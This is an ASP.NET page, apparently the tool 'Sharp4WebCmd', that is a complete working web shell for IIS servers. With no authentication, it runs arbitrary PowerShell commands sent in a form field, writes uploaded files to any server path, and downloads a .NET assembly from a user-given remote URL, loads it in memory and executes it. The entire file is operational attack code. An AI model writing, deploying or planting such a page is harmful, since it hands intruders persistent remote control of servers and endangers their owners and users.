<%@ Page Language="C#" %>
<%@ Assembly Name="System.Management.Automation,Version=3.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35" %>
<%@ Import Namespace="System.Management.Automation" %>
<%@ Import Namespace="System.Management.Automation.Runspaces" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Collections.Generic" %>
<%@ Import Namespace="System.Collections.ObjectModel" %>
<%@ Import Namespace="System.Web" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Reflection" %>

<!DOCTYPE html>
<html lang="en">
<head>
    <title>Sharp4WebCmd Command Console</title>
    <style>
        body {
            font-family: Consolas, monospace;
            background: #1e1e1e;
            color: #f0f0f0;
            padding: 20px;
        }
        .tab-container {
            margin-top: 20px;
        }
        .tab-header {
            display: flex;
            border-bottom: 1px solid #3c3c3c;
            margin-bottom: 15px;
        }
        .tab-button {
            padding: 10px 20px;
            background: #252526;
            color: #f0f0f0;
            border: none;
            border-radius: 5px 5px 0 0;
            cursor: pointer;
            margin-right: 5px;
            font-weight: bold;
        }
        .tab-button.active {
            background: #FF0000;
            color: white;
        }
        .tab-content {
            display: none;
        }
        .tab-content.active {
            display: block;
        }
        #output, #uploadOutput, #remoteOutput {
            background: #252526;
            padding: 15px;
            border-radius: 5px;
            height: 500px;
            overflow-y: auto;
            white-space: pre-wrap;
            margin-bottom: 15px;
        }
        #cmdInput {
            width: 60%;
            padding: 8px;
            background: #3c3c3c;
            color: white;
            border: 1px solid #3c3c3c;
            border-radius: 4px;
        }
        #executeBtn, #uploadBtn, #loadRemoteBtn {
            padding: 8px 15px;
            background: #FF0000;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-left: 0px;
        }
        label {
            margin-left: 15px;
        }
        .command {
            color: #4ec9b0;
            font-weight: bold;
        }
        .output {
            color: #d4d4d4;
        }
        .error {
            color: #f48771;
        }
        .upload-form, .remote-form {
            margin-top: 15px;
        }
        .upload-form input[type="file"], 
        .remote-form input[type="text"] {
            margin-bottom: 10px;
            background: #2d2d30;
            color: #d4d4d4;
            border: 1px solid #3c3c3c;
            border-radius: 4px;
            cursor: pointer;
        }
        .upload-form input[type="file"]::file-selector-button {
            padding: 6px 12px;
            background: #FF0000;
            color: white;
            border: none;
            border-radius: 3px;
            margin-right: 10px;
            cursor: pointer;
        }
        .upload-form input[type="text"],
        .remote-form input[type="text"] {
            width: 60%;
            padding: 8px;
            background: #3c3c3c;
            color: white;
            border: 1px solid #3c3c3c;
            border-radius: 4px;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>
    <h2>Sharp4WebCmd5 Command Console</h2>
    <p><strong>File Path:</strong> <%= Server.MapPath(Request.Path) %></p>
    
    <div class="tab-container">
        <div class="tab-header">
            <button class="tab-button active" onclick="switchTab('commandTab')">Command Execution</button>
            <button class="tab-button" onclick="switchTab('remoteTab')">Assembly Execution</button>
            <button class="tab-button" onclick="switchTab('uploadTab')">File Upload</button>
        </div>
        
        <!-- Command Execution Tab -->
        <div id="commandTab" class="tab-content active">
            <div id="output"></div>
            <div>
                <input type="text" id="cmdInput" placeholder="Enter command or Run Exe File ..." autocomplete="off" />
                <label>
                    <input type="checkbox" id="useCallOperator" />
                    Selected For Run Exe File
                </label>
                <button id="executeBtn">Execute</button>
            </div>
        </div>
        
        <!-- File Upload Tab -->
        <div id="uploadTab" class="tab-content">
            <div id="uploadOutput"></div>
            <div class="upload-form">
                <input type="file" id="fileInput" />
                <input type="text" id="uploadPath" placeholder="Destination path (e.g., C:\Windows\Temp)" />
                <button id="uploadBtn">Upload</button>
            </div>
        </div>
        
        <!-- Remote Load Tab -->
        <div id="remoteTab" class="tab-content">
            <div id="remoteOutput"></div>
            <div class="remote-form">
                <input type="text" id="remoteUrl" placeholder="Remote file URL (e.g., http://example.com/program.exe)" />
                <input type="text" id="remoteArgs" placeholder="Arguments (optional)" />
                <br/>
                <button id="loadRemoteBtn">Execute</button>
            </div>
        </div>
    </div>

    <script>
        // Tab switching functionality
        function switchTab(tabId) {
            // Hide all tabs
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Deactivate all buttons
            document.querySelectorAll('.tab-button').forEach(btn => {
                btn.classList.remove('active');
            });
            
            // Activate selected tab and button
            document.getElementById(tabId).classList.add('active');
            event.currentTarget.classList.add('active');
        }

        // Command execution functionality
        window.onload = function () {
            const storedValue = localStorage.getItem("useCallOperator");
            document.getElementById("useCallOperator").checked = storedValue === "true";
        };

        document.getElementById("useCallOperator").addEventListener("change", function () {
            localStorage.setItem("useCallOperator", this.checked);
        });

        document.getElementById('executeBtn').addEventListener('click', executeCommand);
        document.getElementById('cmdInput').addEventListener('keypress', function (e) {
            if (e.key === 'Enter') executeCommand();
        });

        function executeCommand() {
            let cmd = document.getElementById('cmdInput').value.trim();
            const useCallOp = document.getElementById('useCallOperator').checked;

            if (!cmd) return;

            if (useCallOp && !cmd.startsWith("&")) {
                cmd = `& ${cmd}`;
            }

            const output = document.getElementById('output');
            output.innerHTML += `<div class="command">> ${cmd}</div>`;

            fetch(window.location.href, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-Requested-With': 'XMLHttpRequest'
                },
                body: `command=${encodeURIComponent(cmd)}`
            })
                .then(response => response.text())
                .then(data => {
                    output.innerHTML += `<div class="output">${data}</div>`;
                    output.scrollTop = output.scrollHeight;
                    document.getElementById('cmdInput').value = '';
                })
                .catch(error => {
                    output.innerHTML += `<div class="error">Error: ${error.message}</div>`;
                });
        }

        // File upload functionality
        document.getElementById('uploadBtn').addEventListener('click', uploadFile);

        function uploadFile() {
            const fileInput = document.getElementById('fileInput');
            const uploadPath = document.getElementById('uploadPath').value.trim();
            const output = document.getElementById('uploadOutput');

            if (!fileInput.files.length) {
                output.innerHTML += `<div class="error">Please select a file to upload</div>`;
                return;
            }

            if (!uploadPath) {
                output.innerHTML += `<div class="error">Please specify a destination path</div>`;
                return;
            }

            const file = fileInput.files[0];
            const formData = new FormData();
            formData.append('file', file);
            formData.append('uploadPath', uploadPath);

            output.innerHTML += `<div class="command">Uploading ${file.name} to ${uploadPath}...</div>`;

            fetch(window.location.href, {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(data => {
                output.innerHTML += `<div class="output">${data}</div>`;
                output.scrollTop = output.scrollHeight;
                fileInput.value = '';
            })
            .catch(error => {
                output.innerHTML += `<div class="error">Upload failed: ${error.message}</div>`;
            });
        }

        // Remote load functionality
        document.getElementById('loadRemoteBtn').addEventListener('click', loadRemoteFile);

        function loadRemoteFile() {
            const remoteUrl = document.getElementById('remoteUrl').value.trim();
            const remoteArgs = document.getElementById('remoteArgs').value.trim();
            const output = document.getElementById('remoteOutput');

            if (!remoteUrl) {
                output.innerHTML += `<div class="error">Please enter a remote file URL</div>`;
                return;
            }

            output.innerHTML += `<div class="command">Loading remote file from ${remoteUrl}...</div>`;

            fetch(window.location.href, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-Requested-With': 'XMLHttpRequest'
                },
                body: `remoteUrl=${encodeURIComponent(remoteUrl)}&remoteArgs=${encodeURIComponent(remoteArgs)}`
            })
            .then(response => response.text())
            .then(data => {
                output.innerHTML += `<div class="output">${data}</div>`;
                output.scrollTop = output.scrollHeight;
            })
            .catch(error => {
                output.innerHTML += `<div class="error">Error loading remote file: ${error.message}</div>`;
            });
        }
    </script>

    <% 
    if (Request.HttpMethod == "POST")
    {
        // Handle command execution
        if (!string.IsNullOrEmpty(Request.Form["command"]))
        {
            Response.Clear();
            Response.ContentType = "text/plain";

            try
            {
                string command = Request.Form["command"];
                StringBuilder result = new StringBuilder();

                using (var ps = PowerShell.Create())
                {
                    ps.AddScript(command);                
                    var output = ps.Invoke();

                    foreach (var obj in output)
                    {
                        result.AppendLine(obj.ToString());
                    }

                    if (ps.HadErrors)
                    {
                        foreach (var error in ps.Streams.Error)
                        {
                            result.AppendLine("ERROR: " + error);
                        }
                    }
                }

                Response.Write(HttpUtility.HtmlEncode(result.ToString()));
            }
            catch (Exception ex)
            {
                Response.Write("ERROR: " + HttpUtility.HtmlEncode(ex.Message));
            }

            Response.End();
        }
        // Handle file upload
        else if (Request.Files.Count > 0)
        {
            Response.Clear();
            Response.ContentType = "text/plain";

            try
            {
                HttpPostedFile file = Request.Files["file"];
                string uploadPath = Request.Form["uploadPath"];

                if (file == null || file.ContentLength == 0)
                {
                    Response.Write("ERROR: No file selected or empty file");
                    Response.End();
                    return;
                }

                if (string.IsNullOrEmpty(uploadPath))
                {
                    Response.Write("ERROR: Destination path not specified");
                    Response.End();
                    return;
                }

                // Ensure the path ends with a backslash
                if (!uploadPath.EndsWith("\\"))
                {
                    uploadPath += "\\";
                }

                // Create directory if it doesn't exist
                if (!Directory.Exists(uploadPath))
                {
                    Directory.CreateDirectory(uploadPath);
                }

                string fileName = Path.GetFileName(file.FileName);
                string fullPath = Path.Combine(uploadPath, fileName);

                file.SaveAs(fullPath);

                Response.Write("File uploaded successfully to: " + fullPath);
            }
            catch (Exception ex)
            {
                Response.Write("ERROR: " + HttpUtility.HtmlEncode(ex.Message));
            }

            Response.End();
        }
        // Handle remote file loading and execution
        else if (!string.IsNullOrEmpty(Request.Form["remoteUrl"]))
        {
            Response.Clear();
            Response.ContentType = "text/plain";

            try
            {
                string remoteUrl = Request.Form["remoteUrl"];
                string remoteArgs = Request.Form["remoteArgs"] ?? string.Empty;

                using (WebClient client = new WebClient())
                {
                    byte[] fileData = client.DownloadData(remoteUrl);
                    
                    Assembly assembly = Assembly.Load(fileData);
                    
                    MethodInfo entryPoint = assembly.EntryPoint;
                    if (entryPoint == null)
                    {
                        Response.Write("ERROR: No entry point found in the assembly");
                        Response.End();
                        return;
                    }

                    // Parse arguments
                    string[] args1 = null;

                    var args = new List<string>();
                    bool inQuotes = false;
                    int start = 0;

                    for (int i = 0; i < remoteArgs.Length; i++)
                    {
                        if (remoteArgs[i] == '"')
                        {
                            inQuotes = !inQuotes;
                            if (!inQuotes && start != i)
                            {
                                args.Add(remoteArgs.Substring(start + 1, i - start - 1));
                                start = i + 1;
                            }
                        }
                        else if (remoteArgs[i] == ' ' && !inQuotes)
                        {
                            if (i > start)
                            {
                                args.Add(remoteArgs.Substring(start, i - start));
                            }
                            start = i + 1;
                        }
                    }

                    if (start < remoteArgs.Length)
                    {
                        if (inQuotes)
                        {
                            args.Add(remoteArgs.Substring(start + 1, remoteArgs.Length - start - 1));
                        }
                        else
                        {
                            args.Add(remoteArgs.Substring(start));
                        }
                    }

                    args1 = args.ToArray();


                    if (entryPoint.Name == "Main" && 
                        (entryPoint.GetParameters().Length == 0 || 
                         entryPoint.GetParameters().Length == 1))
                    {
                        var originalOut = Console.Out;
                        var output = new StringBuilder();
                        var writer = new StringWriter(output);
                        Console.SetOut(writer);

                        try
                        {
                            object result = entryPoint.Invoke(null, 
                                entryPoint.GetParameters().Length == 1 ? 
                                new object[] { args1 } : null);
                            
                            writer.Flush();
                            Response.Write(HttpUtility.HtmlEncode(output.ToString()));
                        }
                        finally
                        {
                            Console.SetOut(originalOut);
                        }
                    }
                    else
                    {
                        entryPoint.Invoke(null, null);
                        Response.Write("Assembly loaded and executed successfully (no console output captured)");
                    }
                }
            }
            catch (Exception ex)
            {
                Response.Write("ERROR: " + HttpUtility.HtmlEncode(ex.ToString()));
            }
            finally
            {
                Response.End();
            }
        }
    }


    %>
</body>
</html>

